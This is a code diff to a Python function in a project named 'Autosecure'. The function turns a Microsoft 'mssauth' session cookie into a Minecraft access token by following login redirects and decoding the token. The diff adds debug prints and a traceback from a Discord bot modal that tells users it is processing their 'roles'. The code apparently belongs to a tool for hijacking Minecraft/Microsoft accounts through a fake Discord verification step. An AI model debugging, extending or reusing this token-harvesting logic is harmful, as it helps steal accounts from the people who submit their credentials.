@@ -4,6 +4,24 @@ import json
 import re
 
 # Spamming this endpoint gets you ratelimited for 1~2 minutes
+# When XBL is not found it crashes
+# Traceback (most recent call last):
+#   File "C:\Users\salom\AppData\Local\Programs\Python\Python314\Lib\site-packages\discord\ui\modal.py", line 216, in _scheduled_task
+#     await self.on_submit(interaction)
+#   File "C:\Users\salom\Desktop\Autosecure\views\modals\modal_two.py", line 31, in on_submit
+#     await interaction.response.send_message(
+#         "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
+#     )
+#   File "C:\Users\salom\AppData\Local\Programs\Python\Python314\Lib\site-packages\discord\interactions.py", line 1051, in send_message
+#     response = await adapter.create_interaction_response(
+#                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+#     ...<6 lines>...
+#     )
+#     ^
+#   File "C:\Users\salom\AppData\Local\Programs\Python\Python314\Lib\site-packages\discord\webhook\async_.py", line 224, in request
+#     raise NotFound(response, data)
+# discord.errors.NotFound: 404 Not Found (error code: 10062): Unknown interaction
+
 def getXBL(mssauth: str) -> dict:
 
     data = requests.get(
@@ -13,8 +31,10 @@ def getXBL(mssauth: str) -> dict:
     
     location = data.headers.get('Location')
     if not location:
+        print(data.headers)
         return None
     
+    print("Location 1")
     acessTokenRedirect = requests.get(
         url = location,
         headers = {
@@ -25,8 +45,10 @@ def getXBL(mssauth: str) -> dict:
 
     location = acessTokenRedirect.headers.get('Location')
     if not location:
+        print(acessTokenRedirect.headers)
         return None
     
+    print("Location 2")
     accessTokenRedirect = requests.get(
         url = location,
         allow_redirects = False
@@ -35,12 +57,15 @@ def getXBL(mssauth: str) -> dict:
     # https://www.minecraft.net/en-us/login#state=login&accessToken=<token>
     location = accessTokenRedirect.headers.get('Location')
     if not location:
+        print(acessTokenRedirect.headers)
         return None
     
+    print("Location 3")
     token = re.search(r'accessToken=([^&#]+)', location)
     if not token:
         return None
     
+    print("Token")
     accessToken = token.group(1) + "=" * ((4 - len(token.group(1)) % 4) % 4)
 
     decoded_data = base64.b64decode(accessToken).decode('utf-8')
